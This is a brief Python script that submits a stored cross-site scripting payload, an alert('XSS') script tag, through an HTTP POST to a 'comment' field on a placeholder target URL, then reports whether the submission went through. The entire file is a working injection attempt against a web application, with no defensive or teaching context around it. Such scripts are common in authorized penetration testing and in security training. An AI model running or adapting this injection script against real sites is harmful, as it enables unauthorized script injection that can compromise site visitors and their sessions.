import requests

TARGET_URL = 'http://example.com/vulnerable-post.php'

payload = "<script>alert('XSS');</script>"

def attempt_xss_injection(url, payload):
    # Assuming the vulnerable parameter is 'comment'
    data = {'comment': payload}
    response = requests.post(url, data=data)
    
    if response.status_code == 200:
        print(f"Payload was successfully submitted: {payload}")
        print("Check the target page to see if the script executes.")
    else:
        print("Failed to submit the payload. Response Code:", response.status_code)

if __name__ == "__main__":
    attempt_xss_injection(TARGET_URL, payload)
